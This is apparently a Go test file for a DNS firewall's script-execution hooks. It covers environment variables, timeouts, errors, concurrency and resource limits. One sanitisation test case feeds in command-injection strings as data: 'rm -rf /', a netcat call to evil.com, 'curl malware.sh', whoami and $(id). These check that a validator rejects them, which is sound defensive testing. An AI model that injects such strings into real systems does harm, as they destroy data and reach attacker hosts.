package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"sync"
	"testing"
	"time"
)

func TestExecuteScriptEnvironmentVariables(t *testing.T) {
	// Create a temporary test script that prints environment variables
	testScript := `#!/bin/sh
echo "DFIREWALL_CLIENT_IP=${DFIREWALL_CLIENT_IP}"
echo "DFIREWALL_RESOLVED_IP=${DFIREWALL_RESOLVED_IP}"
echo "DFIREWALL_DOMAIN=${DFIREWALL_DOMAIN}"
echo "DFIREWALL_TTL=${DFIREWALL_TTL}"
echo "DFIREWALL_ACTION=${DFIREWALL_ACTION}"
`
	
	// Write the test script to current directory to ensure it's accessible
	scriptPath := "./test_script.sh"
	if err := os.WriteFile(scriptPath, []byte(testScript), 0755); err != nil {
		t.Fatalf("Failed to create test script: %v", err)
	}
	defer os.Remove(scriptPath)
	
	// Test data
	testClientIP := "192.168.1.100"
	testResolvedIP := "1.2.3.4"
	testDomain := "example.com"
	testTTL := "300"
	testAction := "ALLOW"
	
	// Create command with context (simulating the fixed implementation)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, scriptPath, testClientIP, testResolvedIP, testDomain, testTTL, testAction)
	
	// Set environment variables as done in executeScript
	cmd.Env = []string{"PATH=" + os.Getenv("PATH")}
	cmd.Env = append(cmd.Env,
		fmt.Sprintf("DFIREWALL_CLIENT_IP=%s", testClientIP),
		fmt.Sprintf("DFIREWALL_RESOLVED_IP=%s", testResolvedIP),
		fmt.Sprintf("DFIREWALL_DOMAIN=%s", testDomain),
		fmt.Sprintf("DFIREWALL_TTL=%s", testTTL),
		fmt.Sprintf("DFIREWALL_ACTION=%s", testAction),
	)
	
	// Execute the command
	output, err := cmd.Output()
	if err != nil {
		t.Fatalf("Script execution failed: %v", err)
	}
	
	outputStr := string(output)
	
	// Verify that all environment variables are properly set
	expectedVars := map[string]string{
		"DFIREWALL_CLIENT_IP":   testClientIP,
		"DFIREWALL_RESOLVED_IP": testResolvedIP,
		"DFIREWALL_DOMAIN":      testDomain,
		"DFIREWALL_TTL":         testTTL,
		"DFIREWALL_ACTION":      testAction,
	}
	
	for envVar, expectedValue := range expectedVars {
		expectedLine := fmt.Sprintf("%s=%s", envVar, expectedValue)
		if !strings.Contains(outputStr, expectedLine) {
			t.Errorf("Expected environment variable %s=%s not found in output.\nActual output:\n%s", 
				envVar, expectedValue, outputStr)
		}
	}
}

func TestExecuteScriptTimeout(t *testing.T) {
	// Create a test script that sleeps longer than the timeout
	testScript := `#!/bin/sh
sleep 3
echo "Should not reach here"
`
	
	// Write the test script to current directory to ensure it's accessible
	scriptPath := "./timeout_test.sh"
	if err := os.WriteFile(scriptPath, []byte(testScript), 0755); err != nil {
		t.Fatalf("Failed to create test script: %v", err)
	}
	defer os.Remove(scriptPath)
	
	// Create command with short timeout (matching production timeout mechanism)
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	
	cmd := exec.CommandContext(ctx, scriptPath)
	
	start := time.Now()
	_, err := cmd.Output()
	duration := time.Since(start)
	
	// Should timeout and return an error
	if err == nil {
		t.Error("Expected timeout error, but command succeeded")
	}
	
	// Should timeout within reasonable time (allowing some buffer for Docker overhead)
	if duration > 4*time.Second {
		t.Errorf("Command took too long to timeout: %v", duration)
	}
	
	// Verify it's some kind of error (timeout or kill)
	if err == nil {
		t.Error("Expected an error due to timeout")
	}
}

func TestExecuteScriptErrorHandling(t *testing.T) {
	tests := []struct {
		name        string
		scriptPath  string
		scriptCode  string
		permissions os.FileMode
		expectError bool
	}{
		{
			name:        "Script with exit code 0",
			scriptPath:  "./success_test.sh",
			scriptCode:  "#!/bin/sh\necho 'success'\nexit 0",
			permissions: 0755,
			expectError: false,
		},
		{
			name:        "Script with exit code 1",
			scriptPath:  "./failure_test.sh",
			scriptCode:  "#!/bin/sh\necho 'failure'\nexit 1",
			permissions: 0755,
			expectError: true,
		},
		{
			name:        "Non-executable script",
			scriptPath:  "./non_exec_test.sh",
			scriptCode:  "#!/bin/sh\necho 'test'",
			permissions: 0644,
			expectError: true,
		},
		{
			name:        "Script with stderr output",
			scriptPath:  "./stderr_test.sh",
			scriptCode:  "#!/bin/sh\necho 'error message' >&2\nexit 1",
			permissions: 0755,
			expectError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create test script
			if err := os.WriteFile(tt.scriptPath, []byte(tt.scriptCode), tt.permissions); err != nil {
				t.Fatalf("Failed to create test script: %v", err)
			}
			defer os.Remove(tt.scriptPath)

			// Execute script
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			cmd := exec.CommandContext(ctx, tt.scriptPath)
			
			// Set environment variables as done in executeScript
			cmd.Env = []string{"PATH=" + os.Getenv("PATH")}
			cmd.Env = append(cmd.Env,
				"DFIREWALL_CLIENT_IP=192.168.1.100",
				"DFIREWALL_RESOLVED_IP=1.2.3.4",
				"DFIREWALL_DOMAIN=example.com",
				"DFIREWALL_TTL=300",
				"DFIREWALL_ACTION=ALLOW",
			)

			output, err := cmd.Output()

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error but script succeeded with output: %s", string(output))
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error: %v", err)
				}
			}
		})
	}
}

func TestExecuteScriptConcurrency(t *testing.T) {
	// Create a test script that runs for a short time
	testScript := `#!/bin/sh
echo "Script PID: $$"
sleep 0.1
echo "Script completed"
`
	
	scriptPath := "./concurrent_test.sh"
	if err := os.WriteFile(scriptPath, []byte(testScript), 0755); err != nil {
		t.Fatalf("Failed to create test script: %v", err)
	}
	defer os.Remove(scriptPath)

	// Run multiple scripts concurrently to test for race conditions
	const numConcurrent = 10
	var wg sync.WaitGroup
	errors := make(chan error, numConcurrent)

	for i := 0; i < numConcurrent; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			cmd := exec.CommandContext(ctx, scriptPath)
			cmd.Env = []string{"PATH=" + os.Getenv("PATH")}
			cmd.Env = append(cmd.Env,
				fmt.Sprintf("DFIREWALL_CLIENT_IP=192.168.1.%d", 100+id),
				"DFIREWALL_RESOLVED_IP=1.2.3.4",
				"DFIREWALL_DOMAIN=example.com",
				"DFIREWALL_TTL=300",
				"DFIREWALL_ACTION=ALLOW",
			)

			output, err := cmd.Output()
			if err != nil {
				errors <- fmt.Errorf("script %d failed: %v", id, err)
				return
			}

			// Verify output contains expected content
			if !strings.Contains(string(output), "Script completed") {
				errors <- fmt.Errorf("script %d output missing expected content: %s", id, string(output))
			}
		}(i)
	}

	// Wait for all goroutines to complete
	wg.Wait()
	close(errors)

	// Check for any errors
	for err := range errors {
		t.Error(err)
	}
}

func TestExecuteScriptInputSanitization(t *testing.T) {
	// Create a test script that echoes all its arguments
	testScript := `#!/bin/sh
echo "Args received:"
for arg in "$@"; do
    echo "  '$arg'"
done
`
	
	scriptPath := "./sanitization_test.sh"
	if err := os.WriteFile(scriptPath, []byte(testScript), 0755); err != nil {
		t.Fatalf("Failed to create test script: %v", err)
	}
	defer os.Remove(scriptPath)

	tests := []struct {
		name       string
		clientIP   string
		resolvedIP string
		domain     string
		ttl        string
		action     string
	}{
		{
			name:       "Normal inputs",
			clientIP:   "192.168.1.100",
			resolvedIP: "1.2.3.4",
			domain:     "example.com",
			ttl:        "300",
			action:     "ALLOW",
		},
		{
			name:       "Inputs with dangerous characters",
			clientIP:   "192.168.1.100; rm -rf /",
			resolvedIP: "1.2.3.4|nc evil.com 1234",
			domain:     "example.com && curl malware.sh",
			ttl:        "300`whoami`",
			action:     "ALLOW$(id)",
		},
		{
			name:       "Inputs with quotes",
			clientIP:   "192.168.1.'100'",
			resolvedIP: "1.2.3.\"4\"",
			domain:     "exam'ple.com",
			ttl:        "30\"0",
			action:     "AL'LOW",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Validate inputs as done in executeScript
			if err := validateScriptInput(tt.clientIP, "ip"); err != nil {
				t.Logf("Invalid client IP would be rejected: %v", err)
				return // Script execution would be blocked
			}
			if err := validateScriptInput(tt.resolvedIP, "ip"); err != nil {
				t.Logf("Invalid resolved IP would be rejected: %v", err)
				return // Script execution would be blocked
			}
			if err := validateScriptInput(tt.domain, "domain"); err != nil {
				t.Logf("Invalid domain would be rejected: %v", err)
				return // Script execution would be blocked
			}
			if err := validateScriptInput(tt.ttl, "ttl"); err != nil {
				t.Logf("Invalid TTL would be rejected: %v", err)
				return // Script execution would be blocked
			}
			if err := validateScriptInput(tt.action, "action"); err != nil {
				t.Logf("Invalid action would be rejected: %v", err)
				return // Script execution would be blocked
			}

			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			// Use direct parameter passing as done in fixed executeScript
			cmd := exec.CommandContext(ctx, scriptPath, tt.clientIP, tt.resolvedIP, tt.domain, tt.ttl, tt.action)
			cmd.Env = []string{"PATH=" + os.Getenv("PATH")}

			output, err := cmd.Output()
			if err != nil {
				t.Errorf("Script execution failed: %v", err)
				return
			}

			outputStr := string(output)

			// Verify that dangerous characters are not present in the output
			dangerousChars := []string{";", "|", "&", "$", "`", "(", ")", "'", "\""}
			for _, char := range dangerousChars {
				if strings.Count(outputStr, char) > strings.Count(testScript, char) {
					t.Errorf("Dangerous character %q found in script output, sanitization may have failed", char)
				}
			}

			// Verify basic output structure
			if !strings.Contains(outputStr, "Args received:") {
				t.Error("Script output should contain 'Args received:'")
			}
		})
	}
}

func TestExecuteScriptEnvironmentVariablesComprehensive(t *testing.T) {
	// Test comprehensive environment variable setting
	testScript := `#!/bin/sh
echo "=== Environment Variables ==="
echo "PATH=${PATH}"
echo "DFIREWALL_CLIENT_IP=${DFIREWALL_CLIENT_IP}"
echo "DFIREWALL_RESOLVED_IP=${DFIREWALL_RESOLVED_IP}"
echo "DFIREWALL_DOMAIN=${DFIREWALL_DOMAIN}"
echo "DFIREWALL_TTL=${DFIREWALL_TTL}"
echo "DFIREWALL_ACTION=${DFIREWALL_ACTION}"
echo "=== Custom Variables ==="
env | grep "^CUSTOM_" || echo "No custom variables"
echo "=== End ==="
`
	
	scriptPath := "./env_test.sh"
	if err := os.WriteFile(scriptPath, []byte(testScript), 0755); err != nil {
		t.Fatalf("Failed to create test script: %v", err)
	}
	defer os.Remove(scriptPath)

	tests := []struct {
		name        string
		clientIP    string
		resolvedIP  string
		domain      string
		ttl         string
		action      string
		customEnv   map[string]string
	}{
		{
			name:       "Standard environment",
			clientIP:   "192.168.1.100",
			resolvedIP: "1.2.3.4",
			domain:     "example.com",
			ttl:        "300",
			action:     "ALLOW",
		},
		{
			name:       "With custom environment variables",
			clientIP:   "10.0.0.1",
			resolvedIP: "8.8.8.8",
			domain:     "google.com",
			ttl:        "600",
			action:     "BLOCK",
			customEnv: map[string]string{
				"CUSTOM_VAR1": "value1",
				"CUSTOM_VAR2": "value2",
			},
		},
		{
			name:       "IPv6 addresses",
			clientIP:   "2001:db8::1",
			resolvedIP: "2001:4860:4860::8888",
			domain:     "example.org",
			ttl:        "1800",
			action:     "ALLOW",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			cmd := exec.CommandContext(ctx, scriptPath, tt.clientIP, tt.resolvedIP, tt.domain, tt.ttl, tt.action)
			
			// Set base environment
			cmd.Env = []string{"PATH=" + os.Getenv("PATH")}
			
			// Add custom environment variables if provided
			if tt.customEnv != nil {
				for key, value := range tt.customEnv {
					cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", key, value))
				}
			}
			
			// Add standard dfirewall environment variables
			cmd.Env = append(cmd.Env,
				fmt.Sprintf("DFIREWALL_CLIENT_IP=%s", tt.clientIP),
				fmt.Sprintf("DFIREWALL_RESOLVED_IP=%s", tt.resolvedIP),
				fmt.Sprintf("DFIREWALL_DOMAIN=%s", tt.domain),
				fmt.Sprintf("DFIREWALL_TTL=%s", tt.ttl),
				fmt.Sprintf("DFIREWALL_ACTION=%s", tt.action),
			)

			output, err := cmd.Output()
			if err != nil {
				t.Errorf("Script execution failed: %v", err)
				return
			}

			outputStr := string(output)

			// Verify all dfirewall environment variables are present
			expectedVars := map[string]string{
				"DFIREWALL_CLIENT_IP":   tt.clientIP,
				"DFIREWALL_RESOLVED_IP": tt.resolvedIP,
				"DFIREWALL_DOMAIN":      tt.domain,
				"DFIREWALL_TTL":         tt.ttl,
				"DFIREWALL_ACTION":      tt.action,
			}

			for envVar, expectedValue := range expectedVars {
				expectedLine := fmt.Sprintf("%s=%s", envVar, expectedValue)
				if !strings.Contains(outputStr, expectedLine) {
					t.Errorf("Expected environment variable %s=%s not found in output", envVar, expectedValue)
				}
			}

			// Verify custom environment variables if provided
			if tt.customEnv != nil {
				for key, expectedValue := range tt.customEnv {
					expectedLine := fmt.Sprintf("%s=%s", key, expectedValue)
					if !strings.Contains(outputStr, expectedLine) {
						t.Errorf("Expected custom environment variable %s=%s not found in output", key, expectedValue)
					}
				}
			}

			// Verify PATH is preserved
			if !strings.Contains(outputStr, "PATH=") {
				t.Error("PATH environment variable should be preserved")
			}
		})
	}
}

func TestExecuteScriptResourceLimits(t *testing.T) {
	// Test script that tries to consume resources
	testScript := `#!/bin/sh
# Test memory allocation (limited)
data=$(head -c 1024 /dev/zero | tr '\0' 'a')
echo "Allocated small buffer: ${#data} bytes"

# Test file operations
echo "test data" > /tmp/dfirewall_test_$$
if [ -f /tmp/dfirewall_test_$$ ]; then
    echo "File operation successful"
    rm /tmp/dfirewall_test_$$
else
    echo "File operation failed"
fi

# Test process execution (limited)
echo "Current process: $$"
echo "Script completed successfully"
`
	
	scriptPath := "./resource_test.sh"
	if err := os.WriteFile(scriptPath, []byte(testScript), 0755); err != nil {
		t.Fatalf("Failed to create test script: %v", err)
	}
	defer os.Remove(scriptPath)

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, scriptPath)
	cmd.Env = []string{"PATH=" + os.Getenv("PATH")}
	cmd.Env = append(cmd.Env,
		"DFIREWALL_CLIENT_IP=192.168.1.100",
		"DFIREWALL_RESOLVED_IP=1.2.3.4",
		"DFIREWALL_DOMAIN=example.com",
		"DFIREWALL_TTL=300",
		"DFIREWALL_ACTION=ALLOW",
	)

	start := time.Now()
	output, err := cmd.Output()
	duration := time.Since(start)

	if err != nil {
		t.Errorf("Resource test script failed: %v", err)
		return
	}

	outputStr := string(output)

	// Verify script completed successfully
	if !strings.Contains(outputStr, "Script completed successfully") {
		t.Error("Script should complete successfully with basic resource operations")
	}

	// Verify reasonable execution time (should be fast for simple operations)
	if duration > 30*time.Second {
		t.Errorf("Script took too long to execute: %v", duration)
	}

	// Verify expected operations completed
	if !strings.Contains(outputStr, "Allocated small buffer") {
		t.Error("Memory allocation test should complete")
	}

	if !strings.Contains(outputStr, "File operation successful") {
		t.Error("File operation test should complete successfully")
	}
}